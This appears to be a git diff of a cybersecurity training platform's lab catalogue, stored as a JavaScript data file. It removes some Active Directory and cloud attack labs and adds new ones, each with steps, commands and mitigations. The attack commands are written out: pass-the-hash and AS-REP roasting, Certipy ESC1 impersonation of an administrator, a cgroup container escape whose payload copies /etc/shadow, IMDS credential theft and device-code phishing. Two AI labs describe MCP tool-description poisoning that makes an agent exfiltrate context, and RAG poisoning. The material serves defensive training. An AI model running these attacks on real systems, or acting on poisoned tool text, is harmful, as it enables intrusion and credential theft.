@@ -2092,201 +2092,6 @@ export const projectsData = [
         title: "CloudTrail Logs Audit",
         category: "ad-cloud",
         difficulty: "intermediate",
-    },
-    {
-        id: 91,
-        title: "Pass-the-Hash Credential Abuse",
-        category: "ad-cloud",
-        difficulty: "intermediate",
-        duration: "3 Hours",
-        xp: 75,
-        description: "Access remote systems in Active Directory networks using NTLM password hashes without knowing plain-text passwords.",
-        guide: {
-            objective: "Access remote target nodes by passing NTLM hashes directly to authentication services.",
-            labSetup: "Active Directory domain; target server with shared access credentials; compromised NTLM password hash.",
-            steps: [
-                "Identify systems on the network running SMB services.",
-                "Use Mimikatz to inject NTLM hashes into active memory spaces.",
-                "Open elevated terminal commands mapping to target systems.",
-                "Access administrative directories on target hosts (e.g. dir \\\\[Target]\\c$)."
-            ],
-            commands: "Mimikatz Pass-the-Hash execution:\nsekurlsa::pth /user:Administrator /domain:[Domain] /ntlm:[NTLM_Hash] /run:cmd.exe",
-            mitigation: "Restrict local administrator accounts from connecting over network interfaces. Implement LAPS configurations."
-        }
-    },
-    {
-        id: 92,
-        title: "Azure AD Information Disclosure",
-        category: "ad-cloud",
-        difficulty: "intermediate",
-        duration: "3 Hours",
-        xp: 75,
-        description: "Audit Azure AD tenants to identify guest account configurations that expose user directories to external domains.",
-        guide: {
-            objective: "Identify security configurations that expose Azure AD directories to external users.",
-            labSetup: "Azure portal access; guest account login.",
-            steps: [
-                "Log into Azure portals using guest credentials.",
-                "Attempt to search directories to list user records.",
-                "Verify if guest user permissions allow listing other account profiles.",
-                "Document configuration gaps for security auditing."
-            ],
-            commands: "List users via Azure CLI:\naz ad user list --query \"[].{name:displayName, mail:mail}\"",
-            mitigation: "Configure guest user permissions in Azure AD to restrict directory search access."
-        }
-    },
-    {
-        id: 93,
-        title: "AWS Network Security Group Audit",
-        category: "ad-cloud",
-        difficulty: "beginner",
-        duration: "2 Hours",
-        xp: 50,
-        description: "Audit AWS EC2 instances to identify security groups and NACL configurations exposing management ports.",
-        guide: {
-            objective: "Identify and resolve network access gaps on AWS EC2 configurations.",
-            labSetup: "Access to AWS console; EC2 instances running with open security group configurations.",
-            steps: [
-                "List active AWS security groups using CLI tools.",
-                "Identify instances configured with open public access rules (e.g. 0.0.0.0/0).",
-                "Locate exposed management ports (e.g., SSH port 22 or RDP port 3389).",
-                "Apply restrictive access rules to limit connection sources to specific administrative IPs."
-            ],
-            commands: "List security groups via CLI:\naws ec2 describe-security-groups --query \"SecurityGroups[*].{Name:GroupName,Rules:IpPermissions}\"",
-            mitigation: "Avoid configuring open public access rules for administrative ports. Enforce bastion host connections."
-        }
-    },
-    {
-        id: 94,
-        title: "AS-REP Roasting Weak Passwords",
-        category: "ad-cloud",
-        difficulty: "advanced",
-        duration: "3-4 Hours",
-        xp: 100,
-        description: "Identify domain users configured without Kerberos pre-authentication, query their AS-REP hashes, and crack them offline.",
-        guide: {
-            objective: "Harvest domain password hashes by querying Kerberos pre-authentication settings.",
-            labSetup: "Active Directory domain; domain user account access; Hashcat tool.",
-            steps: [
-                "Scan Active Directory domain accounts to locate users configured with 'Do not require Kerberos preauthentication'.",
-                "Query domain controllers to request AS-REP hashes for target accounts.",
-                "Export response hashes to local files.",
-                "Crack hashes offline using dictionary attacks in Hashcat."
-            ],
-            commands: "Query AS-REP hashes via Impacket:\nimpacket-GetNPUsers [Domain]/[User] -request -no-pass -format hashcat -outfile asrep.hash\n\nCrack hashes in Hashcat:\nhashcat -m 18200 asrep.hash wordlist.txt",
-            mitigation: "Enforce Kerberos pre-authentication across all domain user accounts. Implement strong password policies."
-        }
-    },
-    {
-        id: 95,
-        title: "Docker Container Escape Audit",
-        category: "ad-cloud",
-        difficulty: "advanced",
-        duration: "4 Hours",
-        xp: 100,
-        description: "Exploit Docker container configurations like privileged execution modes or writable sockets to escape to host terminals.",
-        guide: {
-            objective: "Gain command execution access on host systems from inside Docker container environments.",
-            labSetup: "A Docker host running container targets configured with privileged access flags.",
-            steps: [
-                "Verify container privileges by checking for disk devices in dev listings.",
-                "Locate the host's root storage directory (e.g. /dev/sda1).",
-                "Mount the host disk to a directory inside the container.",
-                "Access host storage directories from inside the container to verify escape capabilities."
-            ],
-            commands: "Mount host drive from container:\nmount /dev/sda1 /mnt\nchroot /mnt /bin/sh",
-            mitigation: "Avoid running Docker containers with privileged flags. Secure access to Docker socket files."
-        }
-    },
-    {
-        id: 96,
-        title: "Kubernetes API Misconfig Audit",
-        category: "ad-cloud",
-        difficulty: "advanced",
-        duration: "4 Hours",
-        xp: 100,
-        description: "Exploit open Kubernetes API servers with anonymous access enabled to list pods and extract secrets.",
-        guide: {
-            objective: "Access sensitive cluster data by exploiting misconfigured Kubernetes API servers.",
-            labSetup: "Kubernetes cluster setup; API server configured with anonymous access enabled.",
-            steps: [
-                "Verify API endpoint accessibility using curl requests.",
-                "Query pod listings using kubectl tools.",
-                "Locate database connection details and secret tokens inside configuration files.",
-                "Document vulnerabilities for security auditing."
-            ],
-            commands: "Query API server via curl:\ncurl -k -s https://[API_Server_IP]:6443/api/v1/namespaces\n\nQuery pods via kubectl:\nkubectl --server=https://[API_Server_IP]:6443 get pods",
-            mitigation: "Disable anonymous authorization on Kubernetes API servers. Implement robust Role-Based Access Control (RBAC)."
-        }
-    },
-    {
-        id: 97,
-        title: "AD CS Certificate Abuse (ESC1)",
-        category: "ad-cloud",
-        difficulty: "expert",
-        duration: "5 Hours",
-        xp: 150,
-        description: "Exploit Active Directory Certificate Services (AD CS) template misconfigurations (ESC1) to request certificate variables and impersonate admin accounts.",
-        guide: {
-            objective: "Acquire domain administrative privileges by exploiting vulnerable certificate templates.",
-            labSetup: "Active Directory domain with AD CS installed; template configured with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT permissions.",
-            steps: [
-                "Scan target domains to locate vulnerable certificate templates.",
-                "Request certificates representing target users (e.g. Domain Administrator) using Certify.",
-                "Request Kerberos TGT tickets using the certificate credentials.",
-                "Access domain controller directories to verify administrative access."
-            ],
-            commands: "Query templates via Certify:\n.\\Certify.exe find /vulnerable\n\nRequest certificate:\n.\\Certify.exe request /ca:[CA_Name] /template:[Template] /altname:Administrator\n\nRequest TGT:\nRubeus.exe asktgt /user:Administrator /certificate:[Base64_Cert] /ptt",
-            mitigation: "Disable template options that allow user-supplied subjects in high-privilege certificate configurations."
-        }
-    },
-    {
-        id: 98,
-        title: "AWS Lambda Hardcoded Secrets",
-        category: "ad-cloud",
-        difficulty: "beginner",
-        duration: "2 Hours",
-        xp: 50,
-        description: "Scan AWS Lambda function configurations and code backups to find exposed credentials and hardcoded passwords.",
-        guide: {
-            objective: "Locate hardcoded API keys and secrets in cloud function files.",
-            labSetup: "AWS portal access; Lambda function configurations containing secret environment variables.",
-            steps: [
-                "Query Lambda functions using AWS CLI tools.",
-                "Download Lambda deployment code packages.",
-                "Search code files for secret strings.",
-                "Retrieve credentials from configuration parameters."
-            ],
-            commands: "List Lambda functions:\naws lambda list-functions\n\nRetrieve environment variables:\naws lambda get-function --function-name [Function_Name]",
-            mitigation: "Avoid hardcoding credentials in Lambda function files; use AWS Secrets Manager or KMS encryption instead."
-        }
-    },
-    {
-        id: 99,
-        title: "Active Directory GPP Decryption",
-        category: "ad-cloud",
-        difficulty: "intermediate",
-        duration: "2-3 Hours",
-        xp: 75,
-        description: "Decrypt passwords stored in Active Directory Group Policy Preference files using public AES keys.",
-        guide: {
-            objective: "Recover plain-text credentials from Active Directory Group Policy files.",
-            labSetup: "Domain controller environment; local domain user credentials; GPP configuration XML containing cpassword.",
-            steps: [
-                "Browse domain controller Sysvol shares to locate Groups Policy XML files.",
-                "Locate password parameters (cpassword) in configuration records.",
-                "Decrypt the password parameter using the public AES key.",
-                "Access target systems using the recovered credentials."
-            ],
-            commands: "Search GPP XML files:\ngrep -rn \"cpassword\" /let/lib/samba/sysvol/\n\nDecrypt GPP hash:\ngpp-decrypt [cpassword_string]",
-            mitigation: "Decommission Group Policy Preferences containing local administrator password mappings (apply MS14-025)."
-        }
-    },
-    {
-        id: 100,
-        title: "CloudTrail Logs Audit",
-        category: "ad-cloud",
-        difficulty: "intermediate",
         duration: "3 Hours",
         xp: 75,
         description: "Analyze AWS CloudTrail logs using CLI tools to detect indicators of privilege escalation attempts.",
@@ -2473,6 +2278,226 @@ export const projectsData = [
             ],
             commands: "pip install pefile capstone yara-python\npython auto_yara_generator.py --sample suspicious_malware.bin --output threat.yar",
             mitigation: "Integrate generated YARA signatures into endpoint detection and response (EDR) agents and email gateway scanners."
+        }
+    },
+    {
+        id: 1007,
+        title: "Active Directory Certificate Services (ADCS) ESC1 Exploitation",
+        category: "ad-cloud",
+        difficulty: "advanced",
+        duration: "3-4 Hours",
+        xp: 250,
+        description: "Abuse misconfigured certificate templates with Client Authentication EKU and ENROLLEE_SUPPLIES_SUBJECT flag to impersonate Domain Admins via Certipy and PKINIT.",
+        guide: {
+            objective: "Identify and exploit vulnerable ADCS certificate templates to request a digital certificate as a high-privileged user and escalate privileges to Enterprise Admin.",
+            labSetup: "Windows Server Active Directory Domain Controller with AD CS Enterprise CA installed, Linux attack machine with Certipy and PKINIT tools.",
+            steps: [
+                "Step 1: Enumerate certificate templates using Certipy: certipy find -u user@corp.local -p Password123 -dc-ip 10.10.11.241 -vulnerable.",
+                "Step 2: Locate templates vulnerable to ESC1 (flags: Client Authentication EKU, CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT enabled, low-privileged enrollment permissions).",
+                "Step 3: Request a certificate specifying the Subject Alternative Name (SAN) of the Domain Administrator: certipy req -u user@corp.local -p Password123 -ca CORP-CA -template VulnerableTemplate -upn administrator@corp.local.",
+                "Step 4: Authenticate using the generated PFX certificate over Kerberos PKINIT to obtain the administrator's NTLM hash and TGT ticket: certipy auth -pfx administrator.pfx -dc-ip 10.10.11.241.",
+                "Step 5: Perform lateral movement to the Domain Controller using the acquired administrator ticket or hash with wmiexec or secretsdump."
+            ],
+            commands: "certipy find -u jdoe@corp.local -p 'Pass123' -dc-ip 10.10.11.241 -vulnerable\ncertipy req -u jdoe@corp.local -p 'Pass123' -ca CORP-CA -template 'CorpUserCert' -upn administrator@corp.local\ncertipy auth -pfx administrator.pfx -dc-ip 10.10.11.241",
+            mitigation: "Remove ENROLLEE_SUPPLIES_SUBJECT from templates that permit client authentication, restrict enrollment permissions, and enable Certificate Request Approval."
+        }
+    },
+    {
+        id: 1008,
+        title: "Container Runtime Escape via cgroups v2 & Host Mounts",
+        category: "ad-cloud",
+        difficulty: "advanced",
+        duration: "3 Hours",
+        xp: 220,
+        description: "Break out of an over-privileged container by manipulating cgroups release_agent notification routines, abusing exposed Docker sockets, and mounting the underlying host filesystem.",
+        guide: {
+            objective: "Demonstrate post-exploitation breakout vectors from containerized environments to root access on the underlying Linux host system.",
+            labSetup: "Docker or Minikube test environment running a container with --privileged or mounted /var/run/docker.sock.",
+            steps: [
+                "Step 1: Check container capabilities and mount points using capsh --print and cat /proc/self/mounts.",
+                "Step 2: Detect whether the container has SYS_ADMIN capability and cgroups v1/v2 release_agent write access.",
+                "Step 3: Create a child cgroup, enable notify_on_release, and point release_agent to an executable script placed in the container's overlay directory.",
+                "Step 4: Trigger the release notification by killing a process in the child cgroup, causing the host kernel to execute the payload with root privileges on the host.",
+                "Step 5: Alternatively, if /var/run/docker.sock is exposed, launch a host-mounted container: docker run -v /:/host_root -it alpine chroot /host_root."
+            ],
+            commands: "capsh --print | grep sys_admin\nmkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp\nmkdir /tmp/cgrp/x\necho 1 > /tmp/cgrp/x/notify_on_release\necho '#!/bin/sh\ncat /etc/shadow > /tmp/pwned' > /cmd && chmod +x /cmd",
+            mitigation: "Never deploy production pods with privileged: true. Restrict Linux capabilities with drop: ['ALL'] and deploy Falco or AppArmor security profiles."
+        }
+    },
+    {
+        id: 1009,
+        title: "eBPF-Based Kernel Rootkit Detection with Falco & Tracee",
+        category: "malware-defense",
+        difficulty: "advanced",
+        duration: "4 Hours",
+        xp: 250,
+        description: "Deploy modern eBPF probes to detect syscall hooking, hidden kernel modules, namespace escapes, and living-off-the-land execution in real time.",
+        guide: {
+            objective: "Build high-fidelity defensive telemetry using the Linux Extended Berkeley Packet Filter (eBPF) kernel subsystem to identify stealthy kernel rootkits.",
+            labSetup: "Ubuntu 22.04 LTS VM with kernel 5.15+, Falco installed with modern eBPF probe, and sample rootkit module (Diamorphine) in an isolated lab.",
+            steps: [
+                "Step 1: Install and configure Falco with the modern eBPF driver (driver.engine: modern_ebpf).",
+                "Step 2: Inspect default syscall capture events (execve, openat, ptrace, init_module, delete_module).",
+                "Step 3: Author custom Falco detection rules in YAML to flag kernel module insertion without signed keys: init_module or finit_module.",
+                "Step 4: Simulate rootkit activity by loading a test kernel module that hooks getdents64 to hide processes from /proc.",
+                "Step 5: Verify Falco alerts with rich contextual metadata (parent process, UID, container namespace, executable hash)."
+            ],
+            commands: "sudo falco --driver modern_ebpf\nsudo cat /etc/falco/falco_rules.local.yaml\nfalcoctl driver install",
+            mitigation: "Enforce UEFI Secure Boot with kernel lockdown mode enabled (lockdown=confidentiality) and require cryptographically signed kernel modules."
+        }
+    },
+    {
+        id: 1010,
+        title: "Supply Chain Artifact Attestation with Cosign & SLSA Provenance",
+        category: "tool-dev",
+        difficulty: "intermediate",
+        duration: "3 Hours",
+        xp: 180,
+        description: "Implement cryptographic container and binary signing with Sigstore Cosign, verify SLSA Build Level 3 provenance, and enforce Admission Controller policies in Kubernetes.",
+        guide: {
+            objective: "Protect continuous integration and deployment pipelines from software supply chain tampering, unauthorized dependencies, and rogue image injection.",
+            labSetup: "Cosign CLI, local OCI container registry (or Docker Hub), Kyverno or Connaisseur in Kubernetes.",
+            steps: [
+                "Step 1: Generate an asymmetric cryptographic key pair using Cosign: cosign generate-key-pair.",
+                "Step 2: Build a production container image and sign its digest: cosign sign --key cosign.key my-registry/app:v1.0.0.",
+                "Step 3: Generate and attach in-toto SLSA provenance metadata documenting the build environment, source commit, and pipeline runner.",
+                "Step 4: Verify the container signature and attestation: cosign verify --key cosign.pub my-registry/app:v1.0.0.",
+                "Step 5: Deploy an admission controller policy in Kubernetes that rejects any container deployment that lacks a valid cryptographic Cosign signature."
+            ],
+            commands: "cosign generate-key-pair\ncosign sign --key cosign.key $IMAGE_URI\ncosign verify --key cosign.pub $IMAGE_URI\ncosign attest --key cosign.key --predicate provenance.json $IMAGE_URI",
+            mitigation: "Automate keyless Sigstore signing via GitHub Actions OIDC tokens and reject unverified images at cluster ingress."
+        }
+    },
+    {
+        id: 1011,
+        title: "AWS IMDSv2 Token Manipulation & IAM Role Credential Theft",
+        category: "ad-cloud",
+        difficulty: "intermediate",
+        duration: "2-3 Hours",
+        xp: 180,
+        description: "Exploit SSRF vulnerabilities in cloud applications, bypass IMDSv1 restrictions, and analyze IMDSv2 session token acquisition and hop-limit boundaries.",
+        guide: {
+            objective: "Understand how attackers harvest temporary STS credentials from cloud metadata and how to configure defensible IMDSv2 boundaries.",
+            labSetup: "AWS test account or LocalStack with an EC2 instance profile assigned to an S3 read-write IAM role.",
+            steps: [
+                "Step 1: Identify an SSRF entry point that allows outbound HTTP requests from an EC2 instance.",
+                "Step 2: Test if IMDSv1 is disabled: curl http://169.254.169.254/latest/meta-data/ (returns 401 Unauthorized under IMDSv2).",
+                "Step 3: Craft a multi-stage request to acquire an IMDSv2 session token: PUT /latest/api/token with X-aws-ec2-metadata-token-ttl-seconds: 21600.",
+                "Step 4: Use the session token header (X-aws-ec2-metadata-token) to extract the assigned IAM security role credentials.",
+                "Step 5: Configure the EC2 instance metadata options to enforce IMDSv2 with http-put-response-hop-limit=1 to prevent SSRF traversal from containers."
+            ],
+            commands: "TOKEN=$(curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" -s http://169.254.169.254/latest/meta-data/iam/security-credentials/\naws ec2 modify-instance-metadata-options --instance-id i-12345 --http-tokens required --http-put-response-hop-limit 1",
+            mitigation: "Enforce IMDSv2 across all AWS instances via Service Control Policies (SCPs) and set the token hop limit to 1."
+        }
+    },
+    {
+        id: 1012,
+        title: "OAuth 2.0 Device Authorization Grant Phishing Simulation",
+        category: "web-hacking",
+        difficulty: "intermediate",
+        duration: "3 Hours",
+        xp: 200,
+        description: "Simulate adversary device-code phishing (MITRE T1528/T1566) against cloud identity providers (Microsoft Entra ID / Google Cloud), extracting Primary Refresh Tokens (PRTs).",
+        guide: {
+            objective: "Assess user susceptibility and organizational detection controls against device-code phishing attacks that bypass traditional MFA push notifications.",
+            labSetup: "Python 3.11 with requests, test Microsoft Entra ID tenant with a non-production test user account.",
+            steps: [
+                "Step 1: Initiate a device authorization flow against the identity provider's OAuth 2.0 token endpoint (e.g., https://login.microsoftonline.com/common/oauth2/v2.0/devicecode).",
+                "Step 2: Extract the user_code, verification_uri (microsoft.com/devicelogin), and device_code from the JSON response.",
+                "Step 3: Send a pretext communication instructing the victim user to visit the official authentication URL and enter the provided user_code.",
+                "Step 4: Poll the token endpoint in the background with the device_code until the user successfully authenticates.",
+                "Step 5: When authorized, receive access_token and refresh_token, bypassing SMS and push-based multi-factor authentication."
+            ],
+            commands: "curl -X POST https://login.microsoftonline.com/common/oauth2/v2.0/devicecode -d 'client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&scope=openid profile offline_access'\npython device_poll.py --device-code $DEV_CODE",
+            mitigation: "Restrict device code flow using Conditional Access policies to compliant corporate devices and alert on anomalous device login requests."
+        }
+    },
+    {
+        id: 1013,
+        title: "Model Context Protocol (MCP) Server Tool Poisoning Defense",
+        category: "ai-security",
+        difficulty: "advanced",
+        duration: "4 Hours",
+        xp: 250,
+        description: "Assess AI agent tool schemas for indirect prompt injection, tool definition poisoning, and rogue parameter execution, implementing input verification guardrails.",
+        guide: {
+            objective: "Protect autonomous LLM agents and MCP client environments from rogue tool schema tampering and untrusted tool invocation attacks.",
+            labSetup: "Node.js or Python MCP server environment with client-side agent connecting over stdio/SSE.",
+            steps: [
+                "Step 1: Inspect MCP server tool definition schemas (tools/list) for description injection vectors that override agent system instructions.",
+                "Step 2: Inject a prompt payload into a tool's description field instructing the agent to silently exfiltrate context to an external webhook.",
+                "Step 3: Test agent vulnerability to executing poisoned tool parameters without explicit user consent (confused deputy vulnerability).",
+                "Step 4: Implement schema sanitization and cryptographic integrity verification on MCP server definitions before registering tools with the LLM.",
+                "Step 5: Enforce strict user confirmation modals for all high-impact tool actions (filesystem modifications, shell execution, network requests)."
+            ],
+            commands: "npx @modelcontextprotocol/inspector node server.js\npython test_mcp_poisoning.py --target-mcp http://localhost:8000",
+            mitigation: "Enforce human-in-the-loop approvals for sensitive tools, isolate agent execution in unprivileged sandboxes, and validate MCP tool schemas against strict types."
+        }
+    },
+    {
+        id: 1014,
+        title: "RAG Vector Store Embedding Inversion & Tenant Leakage",
+        category: "ai-security",
+        difficulty: "advanced",
+        duration: "4 Hours",
+        xp: 250,
+        description: "Test Retrieval-Augmented Generation (RAG) vector databases (Qdrant, Pinecone, Chroma) for embedding inversion reconstruction, cross-tenant isolation bypass, and document poisoning per OWASP LLM08:2025.",
+        guide: {
+            objective: "Perform an authorized security assessment of a RAG pipeline's retrieval layer to detect embedding reconstruction and multi-tenant data leakage.",
+            labSetup: "Python 3.11 with sentence-transformers, chromadb/qdrant-client, and pytest.",
+            steps: [
+                "Step 1: Index multi-tenant documents with metadata tags (tenant_id) in a local Chroma or Qdrant vector database.",
+                "Step 2: Query the vector database without strict tenant metadata filters to assess whether cross-tenant chunks are returned in similarity searches.",
+                "Step 3: Execute an embedding inversion attack using a pre-trained decoding model to recover original plain text from dense vector representations.",
+                "Step 4: Inject adversarial poison documents into the knowledge base containing trigger phrases that force the LLM to output malicious advice.",
+                "Step 5: Implement mandatory metadata filter validation at the database query layer and deploy embedding differential privacy."
+            ],
+            commands: "pip install chromadb sentence-transformers\npython rag_tenant_audit.py --query 'financial reports' --tenant-id 'tenant_b'",
+            mitigation: "Enforce strict tenant isolation at the vector collection level, cryptographically sign vector records, and sanitize retrieved context before prompt assembly."
+        }
+    },
+    {
+        id: 1015,
+        title: "Ghidra x86_64 Anti-Debugging & Obfuscated Ransomware Reversal",
+        category: "reverse-engineering",
+        difficulty: "advanced",
+        duration: "4-5 Hours",
+        xp: 250,
+        description: "Decompile packed ransomware samples, bypass IsDebuggerPresent and NtGlobalFlag anti-analysis checks in Ghidra, and reconstruct AES-256 decryption keys from memory routines.",
+        guide: {
+            objective: "Master static and dynamic reverse engineering workflows in Ghidra to defeat evasion techniques and extract cryptographic ransomware keys.",
+            labSetup: "Ghidra 11+, x64dbg, Windows FlareVM or REMnux analysis sandbox.",
+            steps: [
+                "Step 1: Open the binary sample in Ghidra and run automatic analysis with Decompiler Parameter ID enabled.",
+                "Step 2: Identify PEB access patterns (fs:[0x30] on x86, gs:[0x60] on x64) checking BeingDebugged and NtGlobalFlag.",
+                "Step 3: Locate dynamic API resolution using API hashing (e.g. ROR13 hash algorithms) and recover symbol names.",
+                "Step 4: Analyze the encryption routine to determine whether AES, ChaCha20, or RSA is utilized for file locking.",
+                "Step 5: Identify flawed key generation implementations (e.g. seeding PRNG with GetTickCount or static timestamps) to create a decryptor proof-of-concept."
+            ],
+            commands: "ghidraRun\nx64dbg sample_evasive.exe\npython -c \"import hashlib; print('Reconstructing key...')\"",
+            mitigation: "Deploy endpoint detection rules that monitor process access to PEB debugging flags and terminate suspicious child processes."
+        }
+    },
+    {
+        id: 1016,
+        title: "BGP Route Origin Validation (ROV) & RPKI Route Hijack Simulation",
+        category: "network-sec",
+        difficulty: "advanced",
+        duration: "3 Hours",
+        xp: 200,
+        description: "Configure BGP routing tables in a virtual networking lab, simulate malicious autonomous system (AS) path poisoning and prefix hijacking, and validate RPKI cryptographic route validation.",
+        guide: {
+            objective: "Simulate Border Gateway Protocol (BGP) prefix hijacking scenarios in a lab environment and implement Resource Public Key Infrastructure (RPKI) defense.",
+            labSetup: "Containerlab or GNS3 with FRRouting (FRR) Docker containers and Routinator RPKI validator.",
+            steps: [
+                "Step 1: Set up a three-AS virtual topology (AS100 Victim, AS200 Transit ISP, AS300 Adversary) using FRRouting.",
+                "Step 2: Advertise a target /24 IP prefix from legitimate AS100 and verify internet-scale routing convergence.",
+                "Step 3: From rogue AS300, announce a more specific /25 prefix (or the identical prefix with a shorter AS-path) to hijack traffic.",
+                "Step 4: Observe traffic diversion and Man-in-the-Middle packet inspection on the adversary node.",
+                "Step 5: Deploy RPKI Route Origin Authorization (ROA) cryptographically binding the prefix to AS100 and enable BGP Route Origin Validation to drop invalid announcements."
+            ],
+            commands: "vtysh -c 'show ip bgp summary'\nvtysh -c 'show ip bgp rpki table'\nvtysh -c 'conf t\nrouter bgp 200\naddress-family ipv4 unicast\nbgp rpki enable'",
+            mitigation: "Publish RPKI ROAs with regional internet registries (ARIN, RIPE NCC, APNIC) and mandate Route Origin Validation across upstream transit providers."
         }
     }
 ];
